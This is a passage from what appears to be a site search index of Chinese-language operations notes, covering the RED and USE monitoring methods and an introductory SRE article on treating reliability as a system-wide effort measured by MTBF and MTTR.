Cloud\u5728\u57fa\u4e8eGoogle\u7684\u201c4\u4e2a\u9ec4\u91d1\u6307\u6807\u201d\u7684\u539f\u5219\u4e0b\u7ed3\u5408Prometheus\u4ee5\u53caKubernetes\u5bb9\u5668\u5b9e\u8df5\uff0c\u7ec6\u5316\u548c\u603b\u7ed3\u7684\u65b9\u6cd5\u8bba\uff0c\u7279\u522b\u9002\u5408\u4e8e\u4e91\u539f\u751f\u5e94\u7528\u4ee5\u53ca\u5fae\u670d\u52a1\u67b6\u6784\u5e94\u7528\u7684\u76d1\u63a7\u548c\u5ea6\u91cf\u3002\u4e3b\u8981\u5173\u6ce8\u4ee5\u4e0b\u4e09\u79cd\u5173\u952e\u6307\u6807\uff1a</p> <ul> <li> <p>(\u8bf7\u6c42)\u901f\u7387\uff1a\u670d\u52a1\u6bcf\u79d2\u63a5\u6536\u7684\u8bf7\u6c42\u6570\u3002</p> </li> <li> <p>(\u8bf7\u6c42)\u9519\u8bef\uff1a\u6bcf\u79d2\u5931\u8d25\u7684\u8bf7\u6c42\u6570\u3002</p> </li> <li> <p>(\u8bf7\u6c42)\u8017\u65f6\uff1a\u6bcf\u4e2a\u8bf7\u6c42\u7684\u8017\u65f6\u3002</p> </li> </ul> <p>\u5728\u201c4\u5927\u9ec4\u91d1\u4fe1\u53f7\u201d\u7684\u539f\u5219\u4e0b\uff0cRED\u65b9\u6cd5\u53ef\u4ee5\u6709\u6548\u7684\u5e2e\u52a9\u7528\u6237\u8861\u91cf\u4e91\u539f\u751f\u4ee5\u53ca\u5fae\u670d\u52a1\u5e94\u7528\u4e0b\u7684\u7528\u6237\u4f53\u9a8c\u95ee\u9898\u3002</p>"},{"location":"ops/08-xops/#use","title":"USE\u65b9\u6cd5","text":"<p>USE\u65b9\u6cd5\u5168\u79f0\"Utilization Saturation and Errors Method\"\uff0c\u4e3b\u8981\u7528\u4e8e\u5206\u6790\u7cfb\u7edf\u6027\u80fd\u95ee\u9898\uff0c\u53ef\u4ee5\u6307\u5bfc\u7528\u6237\u5feb\u901f\u8bc6\u522b\u8d44\u6e90\u74f6\u9888\u4ee5\u53ca\u9519\u8bef\u7684\u65b9\u6cd5\u3002\u6b63\u5982USE\u65b9\u6cd5\u7684\u540d\u5b57\u6240\u8868\u793a\u7684\u542b\u4e49\uff0cUSE\u65b9\u6cd5\u4e3b\u8981\u5173\u6ce8\u4e0e\u8d44\u6e90\u7684\uff1a\u4f7f\u7528\u7387(Utilization)\u3001\u9971\u548c\u5ea6(Saturation)\u4ee5\u53ca\u9519\u8bef(Errors)\u3002</p> <ul> <li> <p>\u4f7f\u7528\u7387\uff1a\u5173\u6ce8\u7cfb\u7edf\u8d44\u6e90\u7684\u4f7f\u7528\u60c5\u51b5\u3002 \u8fd9\u91cc\u7684\u8d44\u6e90\u4e3b\u8981\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1aCPU\uff0c\u5185\u5b58\uff0c\u7f51\u7edc\uff0c\u78c1\u76d8\u7b49\u7b49\u3002100%\u7684\u4f7f\u7528\u7387\u901a\u5e38\u662f\u7cfb\u7edf\u6027\u80fd\u74f6\u9888\u7684\u6807\u5fd7\u3002</p> </li> <li> <p>\u9971\u548c\u5ea6\uff1a\u4f8b\u5982CPU\u7684\u5e73\u5747\u8fd0\u884c\u6392\u961f\u957f\u5ea6\uff0c\u8fd9\u91cc\u4e3b\u8981\u662f\u9488\u5bf9\u8d44\u6e90\u7684\u9971\u548c\u5ea6(\u6ce8\u610f\uff0c\u4e0d\u540c\u4e8e4\u5927\u9ec4\u91d1\u4fe1\u53f7)\u3002\u4efb\u4f55\u8d44\u6e90\u5728\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u7684\u9971\u548c\u90fd\u53ef\u80fd\u5bfc\u81f4\u7cfb\u7edf\u6027\u80fd\u7684\u4e0b\u964d\u3002</p> </li> <li> <p>\u9519\u8bef\uff1a\u9519\u8bef\u8ba1\u6570\u3002\u4f8b\u5982\uff1a\u201c\u7f51\u5361\u5728\u6570\u636e\u5305\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u68c0\u6d4b\u5230\u7684\u4ee5\u592a\u7f51\u7f51\u7edc\u51b2\u7a81\u4e8614\u6b21\u201d\u3002</p> </li> </ul>"},{"location":"ops/50-sre-mogu-01/","title":"01\uff5cSRE\u8ff7\u601d\uff1a\u65e0\u6240\u4e0d\u80fd\u7684\u89d2\u8272\uff1f\u8fd8\u662f\u8fd0\u7ef4\u7684\u5347\u7ea7\uff1f","text":"<p>\u4e3a\u4ec0\u4e48\u8981\u5f3a\u8c03\u662f\u5b9e\u8df5\u7684\u89d2\u5ea6\u5462\uff1f</p> <p>\u5f00\u7bc7\u8bcd\u91cc\u6211\u4eec\u5c31\u63d0\u5230\u8fc7\uff0c\u6709\u4eba\u8ba4\u4e3aSRE\u5c31\u662f\u4e00\u4e2a\u5c97\u4f4d\uff0c\u800c\u4e14\u662f\u4e00\u4e2a\u5177\u5907\u5168\u6808\u80fd\u529b\u7684\u5c97\u4f4d\uff0c\u53ea\u8981\u6709\u8fd9\u4e48\u4e00\u4e2a\u4eba\uff0c\u4ed6\u5c31\u80fd\u89e3\u51b3\u6240\u6709\u7a33\u5b9a\u6027\u95ee\u9898\u3002\u8fd9\u8fd8\u53ea\u662f\u4e00\u79cd\u7406\u89e3\uff0c\u800c\u4e14\u8fd9\u4e2a\u7406\u89e3\u591a\u662f\u7ad9\u5728\u7ba1\u7406\u8005\u7684\u89d2\u5ea6\u3002</p> <p>\u4e5f\u6709\u4eba\u7ad9\u5728\u8fd0\u7ef4\u4eba\u5458\u7684\u89d2\u5ea6\uff0c\u8ba4\u4e3a\u505a\u597dSRE\u4e3b\u8981\u662f\u505a\u597d\u76d1\u63a7\uff0c\u505a\u5230\u5feb\u901f\u53d1\u73b0\u95ee\u9898\u3001\u5feb\u901f\u627e\u5230\u95ee\u9898\u6839\u56e0\uff1b\u8fd8\u6709\u4eba\u7ad9\u5728\u5e73\u53f0\u7684\u89d2\u5ea6\uff0c\u8ba4\u4e3a\u505a\u597dSRE\u8981\u52a0\u5f3a\u5bb9\u91cf\u89c4\u5212\uff0c\u5b66\u4e60Google\u505a\u5230\u5b8c\u5168\u81ea\u52a8\u5316\u7684\u5f39\u6027\u4f38\u7f29\uff1b\u751a\u81f3\u8fd8\u6709\u4eba\u8ba4\u4e3a\uff0cSRE\u5c31\u662f\u4f20\u7edf\u8fd0\u7ef4\u7684\u5347\u7ea7\u7248\uff0c\u628a\u8fd0\u7ef4\u81ea\u52a8\u5316\u505a\u597d\u5c31\u884c\u4e86\u3002</p> <p>\u4f60\u770b\uff0c\u5176\u5b9e\u4e0d\u540c\u7684\u4eba\u7ad9\u5728\u4e0d\u540c\u7684\u89d2\u5ea6\uff0c\u5bf9SRE\u7684\u7406\u89e3\u5c31\u4f1a\u5929\u5dee\u5730\u522b\uff0c\u4f46\u662f\u597d\u50cf\u53c8\u90fd\u6709\u5404\u81ea\u7684\u9053\u7406\u3002</p> <p>\u6240\u4ee5\uff0c\u6211\u7279\u522b\u5f3a\u8c03\u5b9e\u8df5\u7684\u89d2\u5ea6\uff0c\u6211\u4eec\u4e0d\u7ad9\u961f\uff0c\u5c31\u770b\u771f\u5b9e\u7684\u843d\u5730\u60c5\u51b5\u3002\u6211\u603b\u7ed3\u4e86\u4e00\u4e0b\u4ece\u5b9e\u8df5\u89d2\u5ea6\u770bSRE\u7684\u5173\u952e\u70b9\uff0c\u5c31\u4e00\u4e2a\u8bcd\uff1a\u4f53\u7cfb\u5316\u3002SRE\u662f\u4e00\u5957\u4f53\u7cfb\u5316\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u4e5f\u53ea\u6709\u7528\u5168\u5c40\u89c6\u89d2\u624d\u80fd\u66f4\u900f\u5f7b\u5730\u7406\u89e3\u5b83\u3002</p> <p>\u597d\u4e86\uff0c\u4e0b\u9762\u6211\u4eec\u5c31\u4e00\u8d77\u6765\u770b\u600e\u4e48\u7406\u89e3SRE\u8fd9\u4e2a\u4f53\u7cfb\u5316\u5de5\u7a0b\u3002</p>"},{"location":"ops/50-sre-mogu-01/#sre","title":"SRE\uff0c\u6211\u4eec\u5e94\u8be5\u600e\u4e48\u6765\u7406\u89e3\u5b83\uff1f","text":"<p>\u6211\u5148\u7ed9\u4f60\u5206\u4eab\u4e00\u5f20\u56fe\uff0c\u8fd9\u662f\u7ed3\u5408\u6211\u81ea\u5df1\u56e2\u961f\u7684\u65e5\u5e38\u5de5\u4f5c\uff0c\u505a\u51fa\u6765\u7684SRE\u7a33\u5b9a\u6027\u4fdd\u969c\u89c4\u5212\u56fe\u3002</p> <p></p> <p>\u6211\u4eec\u6700\u521d\u753b\u8fd9\u5f20\u56fe\u662f\u4e3a\u4e86\u63d0\u9ad8\u6545\u969c\u5904\u7406\u6548\u7387\uff0c\u5c06\u6bcf\u4e2a\u9636\u6bb5\u53ef\u4ee5\u505a\u7684\u4e8b\u60c5\u586b\u4e86\u8fdb\u53bb\uff0c\u5e76\u5728\u5b9e\u8df5\u4e2d\u4e0d\u65ad\u8865\u5145\u5b8c\u5584\uff0c\u6700\u7ec8\u5f62\u6210\u4e86\u6211\u4eec\u63a2\u7d22SRE\u7684\u6846\u67b6\u56fe\u3002\u4f60\u5e94\u8be5\u4e5f\u53d1\u73b0\u4e86\uff0c\u8fd9\u91cc\u9762\u5f88\u591a\u4e8b\u60c5\u90fd\u5f88\u5e38\u89c1\uff0c\u6bd4\u5982\u5bb9\u91cf\u8bc4\u4f30\u3001\u6545\u969c\u6f14\u7ec3\u3001\u670d\u52a1\u964d\u7ea7\u3001\u670d\u52a1\u9650\u6d41\u3001\u5f02\u5e38\u7194\u65ad\u3001\u76d1\u63a7\u544a\u8b66\u7b49\u7b49\u3002</p> <p>\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6211\u4e00\u76f4\u7ed9\u4f60\u6253\u6c14\uff0c\u8bf4SRE\u5e76\u4e0d\u795e\u79d8\u3002\u5b66\u4e60SRE\uff0c\u6211\u4eec\u53ef\u4ee5\u6709\u975e\u5e38\u719f\u6089\u7684\u6293\u624b\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e0d\u80fd\u505c\u7559\u5728\u5411Google\u6216\u5176\u4ed6\u5927\u5382\u5b66\u4e60\u5177\u4f53\u7684\u6280\u672f\u7ecf\u9a8c\u4e0a\uff0c\u800c\u662f\u66f4\u5e94\u8be5\u5b66\u4e60\u5982\u4f55\u5c06\u8fd9\u4e9b\u6280\u672f\u6709\u673a\u5730\u7ed3\u5408\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u5957\u7a33\u5b9a\u6027\u4f53\u7cfb\uff0c\u8ba9\u4f53\u7cfb\u53d1\u6325\u51fa\u529b\u91cf\uff0c\u544a\u522b\u53ea\u53d1\u6325\u67d0\u9879\u6280\u672f\u7684\u80fd\u529b\u3002</p> <p>\u540c\u65f6\uff0c\u7ed3\u5408\u8fd9\u4e9b\u5177\u4f53\u7684\u4e8b\u60c5\uff0c\u4f60\u5e94\u8be5\u660e\u767d\uff0c\u8fd9\u4e9b\u5de5\u4f5c\u5e76\u4e0d\u662f\u67d0\u4e2a\u4eba\u3001\u67d0\u4e2a\u89d2\u8272\uff0c\u751a\u81f3\u662f\u67d0\u4e2a\u56e2\u961f\u5c31\u53ef\u4ee5\u5355\u67aa\u5339\u9a6c\u5b8c\u6210\u7684\u3002\u6bd4\u5982\u8fd9\u91cc\u7684\u5f88\u591a\u4e8b\u60c5\u8981\u4f9d\u8d56\u8fd0\u7ef4\u81ea\u52a8\u5316\uff0c\u50cf\u5bb9\u91cf\u6269\u7f29\u5bb9\uff0c\u5fc5\u7136\u4f1a\u4e0e\u8fd0\u7ef4\u56e2\u961f\u6709\u4ea4\u96c6\uff1b\u5982\u679c\u505a\u5f97\u518d\u5f39\u6027\u4e00\u4e9b\uff0c\u8fd8\u9700\u8981\u4e0e\u76d1\u63a7\u7ed3\u5408\uff0c\u5c31\u8981\u4e0e\u76d1\u63a7\u56e2\u961f\u6709\u5408\u4f5c\uff1b\u540c\u65f6\u8fd8\u53ef\u80fd\u4f9d\u8d56DevOps\u63d0\u4f9b\u6301\u7eed\u4ea4\u4ed8\u3001\u914d\u7f6e\u53d8\u66f4\uff0c\u4ee5\u53ca\u7070\u5ea6\u53d1\u5e03\u8fd9\u4e9b\u57fa\u7840\u80fd\u529b\uff0c\u5c31\u8981\u4e0e\u5f00\u53d1\u548c\u6548\u80fd\u56e2\u961f\u6709\u4ea4\u96c6\u3002</p> <p>\u8fd9\u4e9b\u80fd\u529b\u4e4b\u95f4\u7684\u76f8\u4e92\u4f9d\u8d56\uff0c\u5c31\u51b3\u5b9a\u4e86**\u4ece\u804c\u80fd\u5206\u5de5\u4e0a\uff0cSRE\u4f53\u7cfb\u7684\u5efa\u8bbe\u7edd\u4e0d\u662f\u5355\u4e2a\u5c97\u4f4d\u6216\u5355\u4e2a\u90e8\u95e8\u5c31\u80fd\u72ec\u7acb\u5b8c\u6210\u7684\uff0c\u5fc5\u7136\u8981\u6c42\u6709\u9ad8\u6548\u7684\u8de8\u56e2\u961f\u7ec4\u7ec7\u534f\u4f5c\u624d\u53ef\u4ee5**\u3002</p> <p>\u6240\u4ee5\uff0c\u4e0d\u8981\u60f3\u7740\u8bbe\u5b9a\u4e00\u4e2aSRE\u5c97\u4f4d\uff0c\u5c31\u80fd\u628a\u7a33\u5b9a\u6027\u7684\u4e8b\u60c5\u5168\u90e8\u89e3\u51b3\u6389\uff0c\u8fd9\u660e\u663e\u4e0d\u73b0\u5b9e\u3002\u4f60\u5e94\u8be5\u4ece\u4f53\u7cfb\u7684\u89d2\u5ea6\u51fa\u53d1\uff0c\u8bbe\u7f6e\u4e0d\u540c\u7684\u804c\u80fd\u5c97\u4f4d\uff0c\u540c\u65f6\u8fd8\u8981\u6709\u8ba9\u4e0d\u540c\u89d2\u8272\u6709\u6548\u534f\u4f5c\u7684\u673a\u5236\u3002</p> <p>\u4ece\u53e6\u4e00\u4e2a\u89d2\u5ea6\u6765\u8bb2\uff0c\u5982\u679c\u5f53\u524d\u6211\u4eec\u7684\u7a33\u5b9a\u6027\u5efa\u8bbe\u8fd8\u4ec5\u4ec5\u805a\u7126\u5728\u67d0\u4e2a\u6216\u67d0\u4e9b\u5177\u4f53\u7684\u6280\u672f\u70b9\u4e0a\uff0c\u6bcf\u4e2a\u89d2\u8272\u548c\u56e2\u961f\u4e4b\u95f4\u7684\u5de5\u4f5c\u76f8\u5bf9\u8fd8\u662f\u72ec\u7acb\u3001\u5404\u81ea\u4e3a\u6218\u7684\uff0c\u90a3\u5c31\u8bf4\u660eSRE\u4f53\u7cfb\u548c\u7ec4\u7ec7\u7684\u771f\u6b63\u5a01\u529b\u8fd8\u6ca1\u6709\u53d1\u6325\u51fa\u6765\u3002</p> <p>\u6240\u4ee5\uff0c\u5982\u679c\u4f60\u5df2\u7ecf\u662f\u8fd9\u4e9b\u9886\u57df\u7684\u5b9e\u8df5\u8005\uff0c\u6bd4\u5982\u4f60\u662f\u4e00\u4e2a\u8fd0\u7ef4\u5de5\u7a0b\u5e08\uff0c\u6216\u8005\u662f\u4e00\u4f4d\u76d1\u63a7\u5f00\u53d1\u5de5\u7a0b\u5e08\uff0c\u53c8\u6216\u8005\u662f\u4e00\u4e2aDevOps\u5f00\u53d1\u5de5\u7a0b\u5e08\uff0c\u6211\u5efa\u8bae\u4f60\u9664\u4e86\u8d1f\u8d23\u5f53\u524d\u7684\u4e8b\u60c5\u5916\uff0c\u5e94\u8be5\u66f4\u591a\u5730\u5173\u6ce8\u4e00\u4e0bSRE\u5168\u5c40\u89c6\u56fe\u3002\u8fd9\u6837\u4f1a\u5e2e\u52a9\u4f60\u6df1\u5165\u4e86\u89e3SRE\u5c97\u4f4d\u6240\u9700\u8981\u7684\u6280\u672f\u80fd\u529b\uff0c\u8fdb\u800c\u63d0\u5347\u4f60\u7684\u5e73\u53f0\u67b6\u6784\u80fd\u529b\u3002</p> <p>\u8981\u77e5\u9053\uff0c\u5982\u679c\u4e25\u683c\u9075\u5faaGoogle\u7684\u8981\u6c42\uff0cSRE\u5c97\u4f4d\u5bf9\u6280\u672f\u8981\u6c42\u662f\u975e\u5e38\u9ad8\u7684\u3002\u53ea\u6709\u5177\u5907\u4e86\u5168\u9762\u7684\u6280\u672f\u80fd\u529b\uff0c\u62e5\u6709\u4e86\u5168\u5c40\u67b6\u6784\u7684\u601d\u7ef4\uff0c\u4f60\u624d\u4f1a\u5728SRE\u7684\u9053\u8def\u4e0a\u8d70\u5f97\u66f4\u8fdc\u3002</p> <p>\u603b\u7ed3\u4e00\u4e0b\uff0c\u4ece\u5b9e\u8df5\u89d2\u5ea6\u6765\u770b\uff0cSRE\u7684\u529b\u91cf\u4e0d\u80fd\u901a\u8fc7\u4e00\u4e2a\u5c97\u4f4d\u3001\u4e00\u4e2a\u6216\u51e0\u4e2a\u6280\u672f\u5c31\u53d1\u6325\u51fa\u6765\u3002SRE\u662f\u4e00\u4e2a\u4f53\u7cfb\u5316\u5de5\u7a0b\uff0c\u5b83\u9700\u8981\u534f\u540c\u591a\u4e2a\u90e8\u95e8\u3001\u591a\u9879\u6280\u672f</p>"},{"location":"ops/50-sre-mogu-01/#sre_1","title":"\u505a\u597dSRE\u7684\u6839\u672c\u76ee\u7684\u662f\u4ec0\u4e48\uff1f","text":"<p>\u8ba4\u8bc6\u5230SRE\u662f\u4e2a\u4f53\u7cfb\u5316\u7684\u4e8b\u513f\u8fd8\u4e0d\u591f\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u201c\u4ee5\u7ec8\u4e3a\u59cb\u201d\uff0c\u770b\u770bSRE\u6700\u540e\u8981\u8fbe\u6210\u4ec0\u4e48\u6837\u7684\u76ee\u6807\uff0c\u4ee5\u6b64\u6765\u52a0\u6df1\u5bf9\u5b83\u7684\u7406\u89e3\u3002</p> <p>SRE\u505a\u4e86\u8fd9\u4e48\u591a\u7684\u4e8b\u60c5\uff0c\u6700\u540e\u7684\u76ee\u7684\u662f\u4ec0\u4e48\u5462\uff1f</p> <p>\u8fd9\u4e2a\u7b54\u6848\u5f88\u660e\u663e\u561b\uff0c\u5c31\u662f\u63d0\u5347\u7a33\u5b9a\u6027\u3002\u4f46\u662f\u600e\u6837\u624d\u7b97\u63d0\u5347\u4e86\u7a33\u5b9a\u6027\u5462\uff1f\u8981\u56de\u7b54\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u6709\u5fc5\u8981\u6765\u8ba8\u8bba\u4e0b\u7a33\u5b9a\u6027\u7684\u8861\u91cf\u6807\u51c6\u3002</p> <p>\u4ece\u4e1a\u754c\u7a33\u5b9a\u6027\u901a\u7528\u7684\u8861\u91cf\u6807\u51c6\u770b\uff0c\u6709\u4e24\u4e2a\u975e\u5e38\u5173\u952e\u7684\u6307\u6807\uff1a</p> <ul> <li>MTBF\uff0cMean Time Between Failure\uff0c\u5e73\u5747\u6545\u969c\u65f6\u95f4\u95f4\u9694\u3002</li> <li>MTTR\uff0cMean Time To Repair\uff0c \u6545\u969c\u5e73\u5747\u4fee\u590d\u65f6\u95f4\u3002</li> </ul> <p>\u8fd8\u6765\u770b\u524d\u9762\u7684SRE\u7a33\u5b9a\u6027\u4fdd\u969c\u89c4\u5212\u56fe\uff0c\u4f60\u4f1a\u53d1\u73b0\u6211\u4eec\u628a\u6574\u4e2a\u8f6f\u4ef6\u8fd0\u884c\u5468\u671f\u6309\u7167\u8fd9\u4e24\u4e2a\u6307\u6807\u5206\u6210\u4e86\u4e24\u6bb5\u3002\u901a\u4fd7\u5730\u8bf4\uff0cMTBF\u6307\u793a\u4e86\u7cfb\u7edf\u6b63\u5e38\u8fd0\u884c\u7684\u9636\u6bb5\uff0c\u800cMTTR\u5219\u610f\u5473\u7740\u7cfb\u7edf\u6545\u969c\u72b6\u6001\u7684\u9636\u6bb5\u3002</p> <p></p> <p>\u5230\u4e86\u8fd9\u91cc\uff0c\u6211\u4eec\u4e5f\u5c31\u660e\u767d\u4e86\uff0c\u5982\u679c\u60f3\u63d0\u5347\u7a33\u5b9a\u6027\uff0c\u5c31\u4f1a\u6709\u4e24\u4e2a\u65b9\u5411\uff1a\u63d0\u5347MTBF\uff0c\u4e5f\u5c31\u662f\u51cf\u5c11\u6545\u969c\u53d1\u751f\u6b21\u6570\uff0c\u63d0\u5347\u6545\u969c\u53d1\u751f\u95f4\u9694\u65f6\u957f\uff1b\u964d\u4f4eMTTR\uff0c\u6545\u969c\u4e0d\u53ef\u907f\u514d\uff0c\u90a3\u5c31\u63d0\u5347\u6545\u969c\u5904\u7406\u6548\u7387\uff0c\u51cf\u5c11\u6545\u969c\u5f71\u54cd\u65f6\u957f\u3002</p> <p>\u4f60\u60f3\uff0c\u5982\u679c\u6211\u4eec\u628a\u6545\u969c\u53d1\u751f\u65f6\u95f4\u7684\u95f4\u9694\u53d8\u957f\uff0c\u5e76\u5c06\u6545\u969c\u5f71\u54cd\u7684\u65f6\u95f4\u51cf\u5c11\uff0c\u7cfb\u7edf\u7a33\u5b9a\u6027\u662f\u4e0d\u662f\u81ea\u7136\u5c31\u63d0\u5347\u4e86\u5462\uff1f\u7b54\u6848\u662f\u663e\u7136\u7684\u3002</p> <p>\u4eceSRE\u7a33\u5b9a\u6027\u4fdd\u969c\u89c4\u5212\u56fe\u4e2d\uff0c\u53ef\u4ee5\u770b\u51faMTTR\u53ef\u4ee5\u7ec6\u5206\u4e3a4\u4e2a\u6307\u6807\uff1aMTTI\u3001MTTK\u3001MTTF\u548cMTTV\u3002\u6211\u628a\u5b83\u4eec\u7684\u5177\u4f53\u89e3\u91ca\u505a\u4e86\u4e00\u5f20\u56fe\uff0c\u4f60\u53ef\u4ee5\u4fdd\u5b58\u4e0b\u6765\uff0c\u6709\u65f6\u95f4\u5c31\u7422\u78e8\u4e00\u4e0b\u3002\u8fd94\u4e2a\u6307\u6807\uff0c\u4f60\u8981\u70c2\u719f\u4e8e\u5fc3\u3002</p> <p></p> <p>\u73b0\u5728\uff0c\u6211\u4eec\u518d\u6765\u770bSRE\u7a33\u5b9a\u6027\u4fdd\u969c\u89c4\u5212\u8fd9\u5f20\u56fe\uff0c\u4f60\u5c31\u4f1a\u7406\u89e3\uff0c\u4e3a\u4ec0\u4e48\u8981\u628a\u6240\u505a\u7684\u4e8b\u60c5\u5206\u7ec4\u5206\u5757\u5448\u73b0\u3002\u76ee\u7684\u5c31\u662f\u533a\u5206\u6e05\u695a\uff0c\u6211\u4eec\u505a\u7684\u4efb\u4f55\u4e00\u4ef6\u4e8b\u60c5\u3001\u5f00\u53d1\u7684\u4efb\u4f55\u4e00\u5957\u7cfb\u7edf\u3001\u5f15\u5165\u7684\u4efb\u4f55\u4e00\u4e2a\u7406\u5ff5\u548c\u65b9\u6cd5\u8bba\uff0c\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u76ee\u6807\uff0c\u90a3\u5c31\u662f\u201c\u63d0\u5347MTBF\uff0c\u964d\u4f4eMTTR\u201d\uff0c\u4e5f\u5c31\u662f\u628a\u6545\u969c\u53d1\u751f\u65f6\u95f4\u7684\u95f4\u9694\u53d8\u957f\uff0c\u5c06\u6545\u969c\u5f71\u54cd\u7684\u65f6\u95f4\u51cf\u5c11\u3002</p> <p>\u6bd4\u5982\uff0c\u5728Pre-MTBF\u9636\u6bb5\uff08\u65e0\u6545\u969c\u9636\u6bb5\uff09\uff0c\u6211\u4eec\u8981\u505a\u597d\u67b6\u6784\u8bbe\u8ba1\uff0c\u63d0\u4f9b\u9650\u6d41\u3001\u964d\u7ea7\u3001\u7194\u65ad\u8fd9\u4e9bDesign-for-Failure\u7684\u670d\u52a1\u6cbb\u7406\u624b\u6bb5\uff0c\u4ee5\u5177\u5907\u6545\u969c\u5feb\u901f\u9694\u79bb\u7684\u6761\u4ef6\uff1b\u8fd8\u53ef\u4ee5\u8003\u8651\u5f15\u5165\u6df7\u6c8c\u5de5\u7a0b\u8fd9\u6837\u7684\u6545\u969c\u6a21\u62df\u673a\u5236\uff0c\u5728\u7ebf\u4e0a\u6a21\u62df\u6545\u969c\uff0c\u63d0\u524d\u53d1\u73b0\u95ee\u9898\u3002</p> <p>\u5728Post-MTBF\u9636\u6bb5\uff0c\u4e5f\u5c31\u662f\u4e0a\u4e00\u6545\u969c\u521a\u7ed3\u675f\uff0c\u5f00\u542f\u65b0\u7684MTBF\u9636\u6bb5\uff0c\u6211\u4eec\u5e94\u8be5\u8981\u505a\u6545\u969c\u590d\u76d8\uff0c\u603b\u7ed3\u7ecf\u9a8c\uff0c\u627e\u5230\u4e0d\u8db3\uff0c\u843d\u5730\u6539\u8fdb\u63aa\u65bd\u7b49\u3002</p> <p>\u5728MTTI\u9636\u6bb5\uff0c\u6211\u4eec\u5c31\u9700\u8981\u4f9d\u8d56\u76d1\u63a7\u7cfb\u7edf\u5e2e\u6211\u4eec\u53ca\u65f6\u53d1\u73b0\u95ee\u9898\uff0c\u5bf9\u4e8e\u590d\u6742\u5ea6\u8f83\u9ad8\u548c\u4f53\u91cf\u975e\u5e38\u5927\u7684\u7cfb\u7edf\uff0c\u8981\u4f9d\u8d56AIOps\u7684\u80fd\u529b\uff0c\u63d0\u5347\u544a\u8b66\u51c6\u786e\u7387\uff0c\u505a\u51fa\u7cbe\u51c6\u7684\u54cd\u5e94\u3002</p> <p>\u540c\u65f6AIOps\u80fd\u529b\u5728\u5927\u89c4\u6a21\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u5728MTTK\u9636\u6bb5\u4e5f\u975e\u5e38\u5173\u952e\uff0c\u56e0\u4e3a\u6211\u4eec\u5728\u8fd9\u4e2a\u9636\u6bb5\u9700\u8981\u786e\u8ba4\u6839\u56e0\uff0c\u81f3\u5c11\u662f\u6839\u56e0\u7684\u8303\u56f4\u3002</p> <p>\u4f60\u770b\uff0c\u6211\u4eec\u505a\u4e86\u5f88\u591a\u4e8b\u60c5\uff0c \u65b0\u7684\u7406\u5ff5\u548c\u65b9\u6cd5\u51fa\u6765\u540e\u4e5f\u7279\u522b\u613f\u610f\u5c1d\u8bd5\uff0c\u5c31\u662f\u56e0\u4e3a\u6709\u660e\u786e\u7684\u76ee\u6807\uff0c\u6240\u6709\u5de5\u4f5c\u7684\u5f00\u5c55\u90fd\u662f\u56f4\u7ed5\u8fd9\u4e2a\u6838\u5fc3\u76ee\u6807\u800c\u53bb\u7684\u3002</p> <p>\u597d\u4e86\uff0c\u6309\u7167\u4ee5\u7ec8\u4e3a\u59cb\u7684\u601d\u8def\uff0cSRE\u8981\u5b9e\u73b0\u7684\u76ee\u6807\u5c31\u662f\u201c\u63d0\u5347MTBF\u3001\u964d\u4f4eMTTR\u201d\uff0c\u4ece\u8fd9\u4e2a\u89d2\u5ea6\u51fa\u53d1\uff0c\u6211\u4eec\u518d\u6b21\u8ba4\u8bc6\u5230\u4e00\u5b9a\u8981\u628a**SRE\u4f5c\u4e3a\u4e00\u4e2a\u4f53\u7cfb\u5316\u7684\u5de5\u7a0b\u6765\u5efa\u8bbe**\uff0c\u56e0\u4e3a\u5355\u7eaf\u5728\u67d0\u4e9b\u6280\u672f\u70b9\u4e0a\u53d1\u529b\u662f\u6ca1\u6709\u591a\u5927\u610f\u4e49\u7684\u3002</p>"},{"location":"ops/50-sre-mogu-01/#_1","title":"\u603b\u7ed3","text":"<p>\u4eca\u5929\u6211\u8981\u5206\u4eab\u7684\u5185\u5bb9\u5c31\u5230\u8fd9\u91cc\u4e86\u3002\u603b\u7ed3\u4e00\u4e0b\uff0c\u4f60\u9700\u8981\u8bb0\u4f4f\u4e0b\u9762\u8fd9\u4e24\u70b9\u3002</p> <p>\u7b2c\u4e00\uff0c\u6211\u4eec\u9700\u8981\u4ece\u5168\u5c40\u7684\u89d2\u5ea6\u53bb\u7406\u89e3SRE\u3002SRE\u4e00\u5b9a\u662f\u9760\u6574\u4e2a\u6280\u672f\u548c\u7ec4\u7ec7\u4f53\u7cfb\u53d1\u6325\u4f5c\u7528\u7684\uff0c\u5355\u7eaf\u4ece\u67d0\u4e2a\u6280\u672f\u70b9\u6216\u73af\u8282\u51fa\u53d1\uff0c\u90fd\u65e0\u6cd5\u5448\u73b0\u51fa\u6548\u679c\uff0c\u4e5f\u5c31\u662f\u8bf4**SRE\u4e00\u5b9a\u8981\u4ece\u5168\u5c40\u8003\u8651\uff0c\u4f53\u7cfb\u4e00\u5b9a\u8981\u201c\u914d\u5957\u201d**\u3002</p> <p>\u7b2c\u4e8c\uff0cSRE\u7684\u76ee\u7684\uff0c\u672c\u8d28\u4e0a\u662f\u51cf\u5c11\u6545\u969c\u65f6\u95f4\uff0c\u589e\u52a0\u7cfb\u7edf\u6b63\u5e38\u8fd0\u884c\u65f6\u95f4\uff0c\u4e5f\u5c31\u662f \u201c\u51cf\u5c11\u6545\u969c\uff0c\u63d0\u5347MTBF\uff1b\u540c\u65f6\uff0c\u63d0\u5347\u6545\u969c\u5904\u7406\u6548\u7387\uff0c\u964d\u4f4eMTTR\u201d\u3002SRE\u8981\u505a\u7684\u6240\u6709\u4e8b\u513f\uff0c\u90fd\u662f\u4e3a\u8fd9\u4e24\u4e2a\u76ee\u6807\u670d\u52a1\u7684\u3002</p> 